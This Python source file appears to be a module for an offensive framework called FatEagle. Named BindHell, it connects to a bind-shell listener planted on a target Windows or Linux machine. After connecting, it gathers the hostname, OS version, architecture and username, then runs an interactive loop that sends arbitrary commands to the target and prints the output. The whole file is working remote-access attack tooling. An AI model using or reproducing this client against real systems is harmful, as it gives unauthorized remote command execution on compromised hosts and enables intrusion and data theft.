import sys
import fescripts.libs.fescripts
from fescripts.libs.PFable import fable,fable_mode
from colorama import init
init()
from colorama import Fore,Back
import signal
import socket
import os
import subprocess

class BindHell:
    def signal_handler(self,sig, frame):
      self._end()
    signal.signal(signal.SIGINT, signal_handler)
    _fs = fescripts.libs.fescripts.FE_SCRIPTS("BindHell","a FeScript to bind shell in windows and linux.","""generate a listener for target os (windows or linux), run that on target os, run fescript here and connect to target. BOOM! you have bind shell access!""",{'ip': {'Body': '', 'Description': 'target ip address', 'Require': True}, 'port': {'Body': '6666', 'Description': 'your port that you listen on it', 'Require': True}, 'buffer_size': {'Body': '4096', 'Description': 'maximum buffer size', 'Require': True}},"0xDeviI")
    
    def __init__(self):
      pass
    
    def help(self):
        print(self._fs._totalDesc)

    def _help(self):
      return self._fs._totalDesc

    def _author(self):
      return self._fs._author
    
    def info(self):
      print(self._fs._miniDesc + "\n    Author: " + self._fs._author)
    
    def _info(self):
      return self._fs._miniDesc

    def allRequirement(self):
      keys = self._fs._Opt.keys()
      allKeys = []
      for i in keys:
        if (self._fs._Opt[i]['Require'] == True):
          allKeys.append(i)
      return allKeys

    def allSwitches(self):
      keys = self._fs._Opt.keys()
      allKeys = []
      for i in keys:
        allKeys.append(i)
      return allKeys

    def _pre_start(self):
      _all_req = self.allRequirement()
      found = False
      for i in _all_req:
        if (self._fs._Opt[i]["Body"] == ""):
          found = True
          break
      if (found):
        print(Fore.RED + "All requirement switches not filled!" + Fore.RESET)   
      else:
        self._start()

    def showSwitch(self,sw):
      print(self._fs._Opt[sw]["Body"])


    def _start(self):
      print("\nFatEagle Script ' " + Fore.YELLOW + self.__class__.__name__ + Fore.RESET + " '" + Fore.GREEN + " Started!" + Fore.RESET)
      # --------------------------------------------> Script Started!
      accCM = ["sysinfo"]
      defCMs = {
        "linux":{"hostname":"hostname","version":"hostnamectl | grep Kernel","procarch":"hostnamectl | grep Arch | grep -Po '(?<=Architecture: )[^ ]*'","username":"whoami"},
        "windows":{"hostname":"hostname","version":"ver","procarch":"echo %PROCESSOR_ARCHITECTURE%","username":"echo %username%"}}
      SERVER_HOST = self._fs._Opt["ip"]["Body"]
      SERVER_PORT = int(self._fs._Opt["port"]["Body"])
      BUFFER_SIZE = int(self._fs._Opt["buffer_size"]["Body"])
      SEPARATOR = "<sep>"
      sysinfo = ""
      s = socket.socket()
      try:
        s.connect((SERVER_HOST, SERVER_PORT))
      except (ConnectionRefusedError):
        print(Fore.LIGHTRED_EX + "Can't Connect to target!\nReason: Target is down or unreachable!" + Fore.RESET)
      os_type = s.recv(BUFFER_SIZE).decode()
      cwd = s.recv(BUFFER_SIZE).decode()
      s.send(defCMs[os_type]["hostname"].encode())
      output = s.recv(BUFFER_SIZE).decode()
      results, cwd = output.split(SEPARATOR)
      cmName = results.replace("\n","").lstrip()
      s.send(defCMs[os_type]["version"].encode())
      output = s.recv(BUFFER_SIZE).decode()
      results, cwd = output.split(SEPARATOR)
      ver = results.replace("\n","").replace("Kernel: ","").lstrip()
      s.send(defCMs[os_type]["procarch"].encode())
      output = s.recv(BUFFER_SIZE).decode()
      results, cwd = output.split(SEPARATOR)
      arch = results.replace("\n","").lstrip()
      s.send(defCMs[os_type]["username"].encode())
      output = s.recv(BUFFER_SIZE).decode()
      results, cwd = output.split(SEPARATOR)
      username = results.replace("\n","").lstrip()
      sysinfo = f"Computer: {cmName}\nUsername: {username}\nVersion: {ver}\nArchitecture: {arch}\nAccess Type: Bind Shell Access"
      del cmName,username,ver,arch
      while True:
          command = input(Fore.LIGHTRED_EX + f"{cwd}" + Fore.BLUE + " $> " + Fore.RESET)
          if not command.strip():
              continue
          if (command.casefold() == "sysinfo"):
            print(sysinfo)
          if (command.casefold() not in accCM):
            s.send(command.encode())
            if command.lower() == "exit":
                break
            output = s.recv(BUFFER_SIZE).decode()
            results, cwd = output.split(SEPARATOR)
            print(results)
      s.close()
      # --------------------------------------------> Script Stopped!
      self._end()

    def _end(self):
      print("FatEagle Script ' " + Fore.YELLOW + self.__class__.__name__ + Fore.RESET + " '" + Fore.RED + " Stopped!\n\n" + Fore.RESET)
    
    def missedSwitch(self):
      fable_data = []
      keys = self._fs._Opt.keys()
      for i in keys:
        if (self._fs._Opt[i].get("Require") == True and self._fs._Opt[i].get("Body") == ""):
          fable_data.append([i,self._fs._Opt[i].get("Body"),self._fs._Opt[i].get("Description")])
      fabled = fable(["switch name","value","descrption"],fable_data,fable_mode.SLICED)
      print(fabled.popData())

    def switchInfo(self):
      fable_data = []
      keys = self._fs._Opt.keys()
      for i in keys:
        fable_data.append([i,self._fs._Opt[i].get("Body"),str(self._fs._Opt[i].get("Require")),self._fs._Opt[i].get("Description")])
      fabled = fable(["switch name","value","required","descrption"],fable_data,fable_mode.SLICED)
      print(fabled.popData())
    
    def setSwitch(self,prop,value):
      self._fs._Opt[prop]["Body"] = value
